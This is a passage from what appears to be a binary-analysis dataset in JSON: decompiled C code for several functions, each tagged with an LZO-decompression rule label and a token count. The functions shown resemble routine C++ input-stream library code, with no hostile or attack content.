        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00486f30(int32_t *arg_8h, uint32_t arg_ch)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    int32_t *in_ECX;\n    uint8_t *puVar5;\n    uint32_t uVar6;\n    uint var_2ch;\n    uint var_19h;\n    uint var_ch;\n    \n    in_ECX[1] = 0;\n    fcn.00487fd0();\n    if (var_19h != '\\0') {\n        piVar1 = *(in_ECX + *(*in_ECX + -0xc) + 0x78);\n        puVar3 = piVar1[2];\n        if (piVar1[3] < puVar3 || piVar1[3] == puVar3) goto code_r0x00486ff0;\n        uVar2 = *puVar3;\n        uVar6 = uVar2;\ncode_r0x00486f84:\n        if ((arg_ch & 0xff) != uVar2) {\n            do {\n                if (arg_8h[5] < arg_8h[6]) {\n                    *arg_8h[5] = uVar6;\n                    arg_8h[5] = arg_8h[5] + 1;\n                    puVar3 = piVar1[2];\n                    puVar5 = piVar1[3];\n                    in_ECX[1] = in_ECX[1] + 1;\n                    if (puVar5 <= puVar3) goto code_r0x00487034;\ncode_r0x00486fa9:\n                    puVar3 = puVar3 + 1;\n                    piVar1[2] = puVar3;\n                }\n                else {\n                    iVar4 = (**(*arg_8h + 0x34))(uVar6);\n                    if (iVar4 == -1) break;\n                    puVar3 = piVar1[2];\n                    puVar5 = piVar1[3];\n                    in_ECX[1] = in_ECX[1] + 1;\n                    if (puVar3 < puVar5) goto code_r0x00486fa9;\ncode_r0x00487034:\n                    iVar4 = (**(*piVar1 + 0x28))();\n                    if (iVar4 == -1) goto code_r0x00487000;\n                    puVar3 = piVar1[2];\n                    puVar5 = piVar1[3];\n                }\n                if (puVar5 <= puVar3) goto code_r0x00486ff0;\n                uVar6 = *puVar3;\n                if ((arg_ch & 0xff) == uVar6) break;\n            } while( true );\n        }\n    }\n    if (in_ECX[1] != 0) {\n        return;\n    }\n    uVar6 = 4;\ncode_r0x00486fcc:\n    fcn.004bbce0(uVar6 | *(in_ECX + *(*in_ECX + -0xc) + 0x14));\n    return;\ncode_r0x00486ff0:\n    uVar2 = (**(*piVar1 + 0x24))();\n    uVar6 = uVar2 & 0xff;\n    if (uVar2 == 0xffffffff) goto code_r0x00487000;\n    goto code_r0x00486f84;\ncode_r0x00487000:\n    uVar6 = (-(in_ECX[1] == 0) & 4) + 2;\n    goto code_r0x00486fcc;\n}\n",
        "token_count": 831
    },
    "004873e0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004873e0(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_9h;\n    uint var_bp_4h;\n    \n    in_ECX[1] = 0;\n    fcn.00487fd0();\n    if (var_9h != '\\0') {\n        iVar1 = (**(**(in_ECX + *(*in_ECX + -0xc) + 0x78) + 0x20))(arg_8h, arg_ch);\n        in_ECX[1] = iVar1;\n        if (arg_ch != iVar1) {\n            fcn.004bbce0(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 6);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 219
    },
    "00487640": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00487640(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t *piVar1;\n    int32_t *in_ECX;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint32_t var_39h;\n    uint32_t var_34h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_ch;\n    \n    fcn.004bbce0(*(in_ECX + *(*in_ECX + -0xc) + 0x14) & 0xfffffffd);\n    fcn.00487fd0();\n    if ((var_39h != '\\0') && ((*(in_ECX + *(*in_ECX + -0xc) + 0x14) & 5) == 0)) {\n        piVar1 = *(in_ECX + *(*in_ECX + -0xc) + 0x78);\n        (**(*piVar1 + 0x14))(piVar1, arg_8h, arg_ch, arg_10h, arg_14h, 8);\n        if ((var_34h & stack0xffffffc4) == 0xffffffff) {\n            fcn.004bbce0(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 4);\n        }\n    }\n    return;\n}\n",
        "token_count": 362
    },
    "00487790": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00487790(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t *in_ECX;\n    uint32_t var_29h;\n    uint32_t var_24h;\n    uint var_ch;\n    \n    fcn.004bbce0(*(in_ECX + *(*in_ECX + -0xc) + 0x14) & 0xfffffffd);\n    fcn.00487fd0();\n    if ((var_29h != '\\0') && ((*(in_ECX + *(*in_ECX + -0xc) + 0x14) & 5) == 0)) {\n        piVar1 = *(in_ECX + *(*in_ECX + -0xc) + 0x78);\n        (**(*piVar1 + 0x10))(piVar1, arg_8h, arg_ch, arg_10h, 8);\n        if ((var_24h & stack0xffffffd4) == 0xffffffff) {\n            fcn.004bbce0(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 4);\n        }\n    }\n    return;\n}\n",
        "token_count": 295
    },
    "004879b0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __fastcall fcn.004879b0(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint var_9h;\n    uint var_bp_4h;\n    \n    param_1[1] = 0;\n    fcn.004bbce0(*(param_1 + *(*param_1 + -0xc) + 0x14) & 0xfffffffd);\n    fcn.00487fd0(param_1, 1);\n    if (var_9h != '\\0') {\n        iVar2 = *(*param_1 + -0xc) + param_1;\n        piVar1 = *(iVar2 + 0x78);\n        if (piVar1 == NULL) {\ncode_r0x00487a32:\n            fcn.004bbce0(*(iVar2 + 0x14) | 1);\n            return param_1;\n        }\n        if (piVar1[1] < piVar1[2]) {\n            piVar1[2] = piVar1[2] - 1;\n        }\n        else {\n            iVar2 = (**(*piVar1 + 0x2c))(0xffffffff);\n            if (iVar2 == -1) {\n                iVar2 = *(*param_1 + -0xc) + param_1;\n                goto code_r0x00487a32;\n            }\n        }\n    }\n    return param_1;\n}\n",
        "token_count": 345
    },
    "00487fd0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x00488403: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x00488408)\n\nint32_t * __thiscall fcn.00487fd0(uchar *param_1, int32_t *param_2, int32_t *param_3)\n\n{\n    uint32_t *puVar1;\n    int32_t *piVar2;\n    uint8_t uVar3;\n    uint8_t *puVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    uint uVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    uchar *extraout_ECX;\n    int32_t *extraout_ECX_00;\n    int32_t *extraout_ECX_01;\n    uint8_t *puVar10;\n    int32_t iVar11;\n    int32_t iVar12;\n    ulong uVar13;\n    uint8_t *puStack184;\n    char cStack153;\n    uchar *puStack120;\n    int32_t in_stack_ffffff8c;\n    uint8_t uStack104;\n    int32_t *piStack40;\n    int32_t *piStack36;\n    \n    *param_1 = 0;\n    iVar5 = *param_2;\n    iVar9 = *(iVar5 + -0xc) + param_2;\n    piVar6 = *(iVar9 + 0x14);\n    if (*(iVar9 + 0x14) != NULL) goto code_r0x00488095;\n    if (*(iVar9 + 0x70) == 0) {\n        if ((param_3 != '\\0') || ((*(iVar9 + 0xd) & 0x10) == 0)) goto code_r0x004880c0;\ncode_r0x00488023:\n        piVar6 = *(iVar9 + 0x78);\n        puVar10 = piVar6[2];\n        if (piVar6[3] < puVar10 || piVar6[3] == puVar10) {\n            iVar12 = (**(*piVar6 + 0x24))();\n            iVar5 = *param_2;\n            iVar11 = *(iVar5 + -0xc) + param_2;\n            iVar9 = *(iVar11 + 0x7c);\n            if (iVar9 == 0) goto code_r0x004880cd;\n            if (iVar12 == -1) {\ncode_r0x0048808f:\n                piVar6 = *(iVar11 + 0x14) | 2;\n                goto code_r0x00488095;\n            }\n            uVar3 = iVar12;\n        }\n        else {\n            iVar9 = *(iVar9 + 0x7c);\n            uVar3 = *puVar10;\n            if (iVar9 == 0) {\ncode_r0x004880cd:\n                uVar13 = fcn.004bde60();\n                if (uVar13 >> 0x20 == 1) {\n                    fcn.004c2e40(uVar13);\n                    iVar5 = *(*param_2 + -0xc);\n                    puVar1 = param_2 + iVar5 + 0x14;\n                    *puVar1 = *puVar1 | 1;\n                    if ((*(param_2 + iVar5 + 0x10) & 1) != 0) {\n                        fcn.004c32d0();\n                    }\n                    param_2 = fcn.004c32d0();\n                }\n                else {\n                    fcn.004c2e40(uVar13);\n                    iVar5 = *(*param_2 + -0xc);\n                    puVar1 = param_2 + iVar5 + 0x14;\n                    *puVar1 = *puVar1 | 1;\n                    if ((*(param_2 + iVar5 + 0x10) & 1) == 0) {\n                        fcn.004c2fb0();\n                        iVar9 = param_2 + *(*param_2 + -0xc);\n                        goto code_r0x00488100;\n                    }\n                    fcn.004c32d0();\n                }\n                fcn.004c2fb0();\n                uVar7 = fcn.0043a8e0(param_2);\n                fcn.004c2fb0();\n                fcn.0043a8e0(uVar7);\n                *extraout_ECX = 0;\n                iVar5 = *piStack40;\n                iVar9 = *(iVar5 + -0xc) + piStack40;\n                piVar6 = *(iVar9 + 0x14);\n                if (*(iVar9 + 0x14) != NULL) goto code_r0x00488295;\n                if (*(iVar9 + 0x70) == 0) {\n                    if ((piStack36 != '\\0') || ((*(iVar9 + 0xd) & 0x10) == 0)) goto code_r0x004882c0;\ncode_r0x00488223:\n                    piVar6 = *(iVar9 + 0x78);\n                    puVar10 = piVar6[2];\n                    if (piVar6[3] < puVar10 || piVar6[3] == puVar10) {\n                        iVar9 = (**(*piVar6 + 0x24))();\n                        iVar5 = *piStack40;\n                        iVar12 = *(iVar5 + -0xc) + piStack40;\n                        puStack120 = *(iVar12 + 0x7c);\n                        if (puStack120 == NULL) goto code_r0x004882cd;\n                        if (iVar9 == -1) {\ncode_r0x0048828f:\n                            piVar6 = *(iVar12 + 0x14) | 2;\n                            goto code_r0x00488295;\n                        }\n                        uVar3 = iVar9;\n                    }\n                    else {\n                        puStack120 = *(iVar9 + 0x7c);\n                        uVar3 = *puVar10;\n                        if (puStack120 == NULL) {\ncode_r0x004882cd:\n                            uVar13 = fcn.004bde60();\n                            if (uVar13 >> 0x20 == 1) {\n                                fcn.004c2e40(uVar13);\n                                iVar5 = *(*piStack40 + -0xc);\n                                puVar1 = piStack40 + iVar5 + 0x14;\n                                *puVar1 = *puVar1 | 1;\n                                if ((*(piStack40 + iVar5 + 0x10) & 1) != 0) {\n                                    fcn.004c32d0();\n                                }\n                                piStack40 = fcn.004c32d0();\ncode_r0x004883a5:\n                                fcn.004c2fb0();\n                                uVar7 = fcn.0043a8e0(piStack40);\n                                fcn.004c2fb0();\n                                fcn.0043a8e0(uVar7);\n                                piVar6 = *(extraout_ECX_00 + *(*extraout_ECX_00 + -0xc) + 0x7c);\n                                if (piVar6 == NULL) {\n                                    fcn.004bde60();\n                                    piVar6 = extraout_ECX_01;\n                                }\n                                else {\n                                    if (*(piVar6 + 7) == '\\0') {\n                                        fcn.004512b0();\n                                        if (*(*piVar6 + 0x18) != 0x451560) {\n                                            (**(*piVar6 + 0x18))(10);\n                                        }\n                                    }\n                                    in_stack_ffffff8c = 0x488408;\n                                    piVar6 = extraout_ECX_00;\n                                }\n                                piVar6[1] = 0;\n                                fcn.00487fd0(piVar6, 1);\n                                if (cStack153 == '\\0') {\n                                    if (in_stack_ffffff8c < 1) {\n                                        iVar5 = piVar6[1];\n                                    }\n                                    else {\n                                        *puStack120 = 0;\n                                        iVar5 = piVar6[1];\n                                    }\njoined_r0x004886e7:\n                                    if (iVar5 != 0) {\n                                        return piVar6;\n                                    }\n                                    uVar8 = 4;\ncode_r0x004884a5:\n                                    fcn.004bbce0(uVar8 | *(piVar6 + *(*piVar6 + -0xc) + 0x14));\n                                    return piVar6;\n                                }\n                                piVar2 = *(piVar6 + *(*piVar6 + -0xc) + 0x78);\n                                puVar10 = piVar2[2];\n                                if (piVar2[3] < puVar10 || piVar2[3] == puVar10) {\n                                    uVar8 = (**(*piVar2 + 0x24))();\n                                }\n                                else {\n                                    uVar8 = *puVar10;\n                                }\n                                iVar9 = piVar6[1];\ncode_r0x004884fc:\n                                iVar5 = iVar9 + 1;\n                                if (iVar5 < in_stack_ffffff8c) {\n                                    do {\n                                        if (uVar8 == 0xffffffff) {\ncode_r0x00488670:\n                                            if (0 < in_stack_ffffff8c) {\n                                                *puStack120 = 0;\n                                            }\n                                            iVar9 = piVar6[1];\n                                            goto code_r0x0048867e;\n                                        }\n                                        puStack184 = piVar2[3];\n                                        puVar10 = piVar2[2];\n                                        if (uStack104 == uVar8) goto code_r0x004886c0;\n                                        iVar5 = (in_stack_ffffff8c - iVar9) + -1;\n                                        iVar12 = puStack184 - puVar10;\n                                        if (iVar5 <= puStack184 - puVar10) {\n                                            iVar12 = iVar5;\n                                        }\n                                        if (iVar12 < 2) {\n                                            *puStack120 = uVar8;\n                                            puVar4 = piVar2[2];\n                                            puStack120 = puStack120 + 1;\n                                            puVar10 = piVar2[3];\n                                            piVar6[1] = piVar6[1] + 1;\n                                            if (puVar4 < puVar10) {\n                                                puVar4 = puVar4 + 1;\n                                                piVar2[2] = puVar4;\n                                            }\n                                            else {\n                                                iVar5 = (**(*piVar2 + 0x28))();\n                                                if (iVar5 == -1) goto code_r0x00488670;\n                                                puVar4 = piVar2[2];\n                                                puVar10 = piVar2[3];\n                                            }\n                                            if (puVar4 < puVar10) {\n                                                uVar8 = *puVar4;\n                                                iVar9 = piVar6[1];\n                                            }\n                                            else {\n                                                uVar8 = (**(*piVar2 + 0x24))();\n                                                iVar9 = piVar6[1];\n                                            }\n                                            goto code_r0x004884fc;\n                                        }\n                                        puVar4 = sub.msvcrt.dll_memchr(puVar10, uStack104, iVar12);\n                                        if ((puVar4 == NULL) || (iVar12 = puVar4 - puVar10,  iVar12 != 0)) {\n                                            sub.msvcrt.dll_memcpy(puStack120, puVar10, iVar12);\n                                            puStack184 = piVar2[3];\n                                            iVar9 = piVar6[1];\n                                            puVar4 = piVar2[2] + iVar12;\n                                        }\n                                        iVar9 = iVar9 + iVar12;\n                                        piVar2[2] = puVar4;\n                                        puStack120 = puStack120 + iVar12;\n                                        piVar6[1] = iVar9;\n                                        if (puStack184 <= puVar4) goto code_r0x00488640;\n                                        uVar8 = *puVar4;\n                                        iVar5 = iVar9 + 1;\n                                        if (in_stack_ffffff8c <= iVar5) break;\n                                    } while( true );\n                                }\n                                if (uVar8 == 0xffffffff) {\n                                    if (0 < in_stack_ffffff8c) {\n                                        *puStack120 = 0;\n                                        uVar8 = (-(piVar6[1] == 0) & 4) + 2;\n                                        goto code_r0x004884a5;\n                                    }\ncode_r0x0048867e:\n                                    uVar8 = 2;\ncode_r0x00488683:\n                                    if (iVar9 == 0) {\n                                        uVar8 = uVar8 | 4;\n                                    }\n                                    goto code_r0x004884a5;\n                                }\n                                if (uStack104 != uVar8) {\n                                    if (0 < in_stack_ffffff8c) {\n                                        *puStack120 = 0;\n                                        uVar8 = 4;\n                                        goto code_r0x004884a5;\n                                    }\n                                    uVar8 = 4;\n                                    goto code_r0x00488683;\n                                }\n                                puStack184 = piVar2[3];\n                                puVar10 = piVar2[2];\ncode_r0x004886c0:\n                                piVar6[1] = iVar5;\n                                if (puVar10 < puStack184) {\n                                    piVar2[2] = puVar10 + 1;\n                                    if (0 < in_stack_ffffff8c) {\n                                        *puStack120 = 0;\n                                        iVar5 = piVar6[1];\n                                    }\n                                }\n                                else {\n                                    (**(*piVar2 + 0x28))();\n                                    if (in_stack_ffffff8c < 1) {\n                                        iVar5 = piVar6[1];\n                                    }\n                                    else {\n                                        *puStack120 = 0;\n                                        iVar5 = piVar6[1];\n                                    }\n                                }\n                                goto joined_r0x004886e7;\n                            }\n                            fcn.004c2e40(uVar13);\n                            iVar5 = *(*piStack40 + -0xc);\n                            puVar1 = piStack40 + iVar5 + 0x14;\n                            *puVar1 = *puVar1 | 1;\n                            if ((*(piStack40 + iVar5 + 0x10) & 1) != 0) {\n                                fcn.004c32d0();\n                                goto code_r0x004883a5;\n                            }\n                            fcn.004c2fb0();\n                            iVar9 = piStack40 + *(*piStack40 + -0xc);\n                            goto code_r0x00488300;\n                        }\n                    }\n                    if ((*(*(puStack120 + 0x18) + uVar3 * 2) & 0x20) != 0) {\n                        do {\n                            puVar10 = piVar6[3];\n                            if (puVar10 <= piVar6[2]) {\n                                iVar5 = (**(*piVar6 + 0x28))();\n                                if (iVar5 != -1) {\n                                    puVar4 = piVar6[2];\n                                    puVar10 = piVar6[3];\n                                    goto code_r0x00488256;\n                                }\ncode_r0x00488288:\n                                iVar12 = piStack40 + *(*piStack40 + -0xc);\n                                goto code_r0x0048828f;\n                            }\n                            puVar4 = piVar6[2] + 1;\n                            piVar6[2] = puVar4;\ncode_r0x00488256:\n                            if (puVar4 < puVar10) {\n                                uVar3 = *puVar4;\n                            }\n                            else {\n                                iVar5 = (**(*piVar6 + 0x24))();\n                                if (iVar5 == -1) goto code_r0x00488288;\n                                uVar3 = iVar5;\n                            }\n                        } while ((*(*(puStack120 + 0x18) + uVar3 * 2) & 0x20) != 0);\n                        iVar5 = *piStack40;\n                    }\n                    piStack36 = *(piStack40 + *(iVar5 + -0xc) + 0x14);\n                }\n                else {\n                    fcn.00489400();\n                    iVar5 = *piStack40;\n                    iVar9 = *(iVar5 + -0xc) + piStack40;\n                    if ((piStack36 == '\\0') && ((*(iVar9 + 0xd) & 0x10) != 0)) goto code_r0x00488223;\ncode_r0x00488300:\n                    piStack36 = *(iVar9 + 0x14);\n                }\n                piVar6 = piStack36;\n                if (piStack36 == NULL) {\ncode_r0x004882c0:\n                    *extraout_ECX = 1;\n                    return piStack36;\n                }\ncode_r0x00488295:\n                piVar6 = fcn.004bbce0(piVar6 | 4);\n                return piVar6;\n            }\n        }\n        if ((*(*(iVar9 + 0x18) + uVar3 * 2) & 0x20) != 0) {\n            do {\n                puVar10 = piVar6[3];\n                if (puVar10 <= piVar6[2]) {\n                    iVar5 = (**(*piVar6 + 0x28))();\n                    if (iVar5 != -1) {\n                        puVar4 = piVar6[2];\n                        puVar10 = piVar6[3];\n                        goto code_r0x00488056;\n                    }\ncode_r0x00488088:\n                    iVar11 = param_2 + *(*param_2 + -0xc);\n                    goto code_r0x0048808f;\n                }\n                puVar4 = piVar6[2] + 1;\n                piVar6[2] = puVar4;\ncode_r0x00488056:\n                if (puVar4 < puVar10) {\n                    uVar3 = *puVar4;\n                }\n                else {\n                    iVar5 = (**(*piVar6 + 0x24))();\n                    if (iVar5 == -1) goto code_r0x00488088;\n                    uVar3 = iVar5;\n                }\n            } while ((*(*(iVar9 + 0x18) + uVar3 * 2) & 0x20) != 0);\n            iVar5 = *param_2;\n        }\n        param_3 = *(param_2 + *(iVar5 + -0xc) + 0x14);\n    }\n    else {\n        fcn.00489400();\n        iVar5 = *param_2;\n        iVar9 = *(iVar5 + -0xc) + param_2;\n        if ((param_3 == '\\0') && ((*(iVar9 + 0xd) & 0x10) != 0)) goto code_r0x00488023;\ncode_r0x00488100:\n        param_3 = *(iVar9 + 0x14);\n    }\n    piVar6 = param_3;\n    if (param_3 == NULL) {\ncode_r0x004880c0:\n        *param_1 = 1;\n        return param_3;\n    }\ncode_r0x00488095:\n    piVar6 = fcn.004bbce0(piVar6 | 4);\n    return piVar6;\ncode_r0x00488640:\n    uVar8 = (**(*piVar2 + 0x24))();\n    iVar9 = piVar6[1];\n    goto code_r0x004884fc;\n}\n",
        "token_count": 4240
    },
    "00488770": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_9h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00488770(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    int32_t *in_ECX;\n    int32_t iVar3;\n    uint var_9h;\n    \n    in_ECX[1] = 0;\n    fcn.004bbce0(*(in_ECX + *(*in_ECX + -0xc) + 0x14) & 0xfffffffd);\n    fcn.00487fd0();\n    if (var_9h != '\\0') {\n        iVar3 = *(*in_ECX + -0xc) + in_ECX;\n        piVar1 = *(iVar3 + 0x78);\n        if (piVar1 == NULL) {\ncode_r0x00488802:\n            fcn.004bbce0(*(iVar3 + 0x14) | 1);\n            return;\n        }\n        uVar2 = piVar1[2];\n        if ((piVar1[1] < uVar2) && (arg_8h == *(uVar2 - 1))) {\n            piVar1[2] = uVar2 - 1;\n        }\n        else {\n            iVar3 = (**(*piVar1 + 0x2c))(arg_8h);\n            if (iVar3 == -1) {\n                iVar3 = *(*in_ECX + -0xc) + in_ECX;\n                goto code_r0x00488802;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 356
    },
    "00488890": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00488890(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    uint var_9h;\n    uint var_bp_4h;\n    \n    in_ECX[1] = 0;\n    fcn.00487fd0();\n    if (var_9h != '\\0') {\n        piVar1 = *(in_ECX + *(*in_ECX + -0xc) + 0x78);\n        iVar2 = piVar1[3] - piVar1[2];\n        if (iVar2 == 0) {\n            iVar2 = (**(*piVar1 + 0x1c))();\n        }\n        if (0 < iVar2) {\n            if (arg_ch < iVar2) {\n                iVar2 = arg_ch;\n            }\n            iVar2 = (**(**(in_ECX + *(*in_ECX + -0xc) + 0x78) + 0x20))(arg_8h, iVar2);\n            in_ECX[1] = iVar2;\n            return iVar2;\n        }\n        if (iVar2 == -1) {\n            fcn.004bbce0(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 2);\n        }\n    }\n    return in_ECX[1];\n}\n",
        "token_count": 337
    },
    "00488a80": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00488a80(uint arg_8h)\n\n{\n    uint *in_ECX;\n    uint var_ch;\n    \n    fcn.004bad50();\n    in_ECX[0x1e] = 0;\n    *(in_ECX + 0x1f) = 0;\n    in_ECX[0x20] = 0;\n    in_ECX[0x21] = 0;\n    in_ECX[0x22] = 0;\n    in_ECX[0x23] = 0;\n    *in_ECX = 0x52be68;\n    in_ECX[2] = 0x52be7c;\n    in_ECX[1] = 0;\n    fcn.004bbb80(arg_8h);\n    return;\n}\n",
        "token_count": 191
    },
    "00488b10": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __fastcall fcn.00488b10(uint *param_1)\n\n{\n    uint var_ch;\n    \n    fcn.004bad50();\n    param_1[0x1e] = 0;\n    *(param_1 + 0x1f) = 0;\n    param_1[0x20] = 0;\n    param_1[0x21] = 0;\n    param_1[0x22] = 0;\n    param_1[0x23] = 0;\n    *param_1 = 0x52be68;\n    param_1[2] = 0x52be7c;\n    param_1[1] = 0;\n    fcn.004bbb80(0);\n    return;\n}\n",
        "token_count": 182
    },
    "00488f60": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __cdecl fcn.00488f60(uint *arg_8h)\n\n{\n    uint32_t *puVar1;\n    char cVar2;\n    int32_t *piVar3;\n    uint uVar4;\n    int32_t *piVar5;\n    uint32_t uVar6;\n    uint8_t *puVar7;\n    int32_t *extraout_ECX;\n    int32_t *extraout_ECX_00;\n    int32_t *extraout_ECX_01;\n    int32_t *extraout_ECX_02;\n    int32_t *extraout_ECX_03;\n    int32_t *extraout_ECX_04;\n    int32_t *extraout_ECX_05;\n    int32_t *in_ECX;\n    int32_t *extraout_ECX_06;\n    uint8_t *puVar8;\n    int32_t iVar9;\n    uchar *puVar10;\n    int32_t unaff_EDI;\n    ulong uVar11;\n    char cStack653;\n    int32_t in_stack_fffffd98;\n    uchar *in_stack_fffffd9c;\n    uint32_t uStack604;\n    uint uVar12;\n    char cStack537;\n    uint32_t uStack536;\n    uint uStack520;\n    int32_t iStack516;\n    int32_t iStack512;\n    uchar *puStack508;\n    int32_t *piStack504;\n    uint uStack500;\n    int32_t *piStack496;\n    uint uStack492;\n    int32_t iStack488;\n    uchar *puStack484;\n    uint uStack480;\n    char cStack453;\n    uint32_t uStack452;\n    uint uStack436;\n    int32_t iStack432;\n    int32_t iStack428;\n    uchar *puStack424;\n    int32_t *piStack420;\n    uint uStack416;\n    int32_t *piStack412;\n    uint uStack408;\n    int32_t iStack404;\n    uchar *puStack400;\n    uint uStack396;\n    char cStack369;\n    uint32_t uStack368;\n    uint uStack352;\n    int32_t iStack348;\n    int32_t iStack344;\n    uchar *puStack340;\n    int32_t *piStack336;\n    uint uStack332;\n    int32_t *piStack328;\n    uint uStack324;\n    int32_t iStack320;\n    uchar *puStack316;\n    uint uStack312;\n    char cStack285;\n    uint32_t uStack284;\n    uint uStack268;\n    int32_t iStack264;\n    int32_t iStack260;\n    uchar *puStack256;\n    int32_t *piStack252;\n    uint uStack248;\n    int32_t *piStack244;\n    uint uStack240;\n    int32_t iStack236;\n    uchar *puStack232;\n    uint uStack228;\n    char cStack201;\n    uint32_t uStack200;\n    uint uStack184;\n    int32_t iStack180;\n    int32_t iStack176;\n    uchar *puStack172;\n    int32_t *piStack168;\n    uint uStack164;\n    int32_t *piStack160;\n    uint uStack156;\n    int32_t iStack152;\n    uchar *puStack148;\n    uint uStack144;\n    char cStack117;\n    uint32_t uStack116;\n    uint uStack100;\n    int32_t iStack96;\n    int32_t iStack92;\n    uchar *puStack88;\n    int32_t *piStack84;\n    uint uStack80;\n    int32_t *piStack76;\n    uint uStack72;\n    int32_t iStack68;\n    int32_t iStack64;\n    uint *puStack60;\n    uint32_t var_21h;\n    uint var_1ch;\n    uint var_ch;\n    \n    uStack72 = 0;\n    uStack80 = 0x488f7e;\n    piStack76 = in_ECX;\n    fcn.00487fd0();\n    if (var_21h == '\\0') {\n        return in_ECX;\n    }\n    stack0xffffffdc = 0;\n    iStack96 = *(*in_ECX + -0xc) + in_ECX;\n    if (*(iStack96 + 0x84) != NULL) {\n        piStack84 = *(iStack96 + 0x78);\n        puStack60 = &fcn.00488f60::var_1ch;\n        iStack64 = &fcn.00488f60::var_21h + 1;\n        piStack76 = NULL;\n        uStack72 = 0xffffffff;\n        uStack80 = 0xffffffff;\n        puStack88 = 0x488fd6;\n        iStack68 = iStack96;\n        (**(**(iStack96 + 0x84) + 0xc))();\n        *arg_8h = var_1ch;\ncode_r0x00488fe1:\n        if (stack0xffffffdc == 0) {\n            return in_ECX;\n        }\n        piStack84 = stack0xffffffdc | *(in_ECX + *(*in_ECX + -0xc) + 0x14);\n        puStack88 = 0x489006;\n        fcn.004bbce0();\n        return in_ECX;\n    }\n    puStack88 = 0x48901a;\n    uVar11 = fcn.004bde60();\n    piStack84 = uVar11;\n    if (uVar11 >> 0x20 == 1) {\n        puStack88 = 0x489044;\n        fcn.004c2e40();\n        iVar9 = *(*in_ECX + -0xc);\n        puVar1 = in_ECX + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(in_ECX + iVar9 + 0x10) & 1) == 0) {\n            puStack88 = 0x489058;\n            fcn.004c32d0();\n        }\n        puStack88 = 0x48905d;\n        in_ECX = fcn.004c32d0();\n    }\n    else {\n        puStack88 = 0x489027;\n        fcn.004c2e40();\n        unaff_EDI = *(*in_ECX + -0xc) + in_ECX;\n        *(unaff_EDI + 0x14) = *(unaff_EDI + 0x14) | 1;\n        if ((*(unaff_EDI + 0x10) & 1) == 0) {\n            puStack88 = 0x48903d;\n            fcn.004c2fb0();\n            goto code_r0x00488fe1;\n        }\n        puStack88 = 0x489066;\n        fcn.004c32d0();\n    }\n    puStack88 = 0x48906b;\n    fcn.004c2fb0();\n    puStack88 = 0x489073;\n    piStack84 = in_ECX;\n    uStack100 = fcn.0043a8e0();\n    puStack88 = 0x48907a;\n    fcn.004c2fb0();\n    puStack88 = 0x489082;\n    piStack84 = uStack100;\n    fcn.0043a8e0();\n    uStack156 = 0;\n    uStack164 = 0x48656e;\n    piStack160 = extraout_ECX_06;\n    iStack92 = unaff_EDI;\n    puStack88 = &stack0xfffffffc;\n    fcn.00487fd0();\n    if (cStack117 == '\\0') {\n        return extraout_ECX_06;\n    }\n    uStack116 = 0;\n    iStack180 = *(*extraout_ECX_06 + -0xc) + extraout_ECX_06;\n    if (*(iStack180 + 0x84) != NULL) {\n        piStack168 = 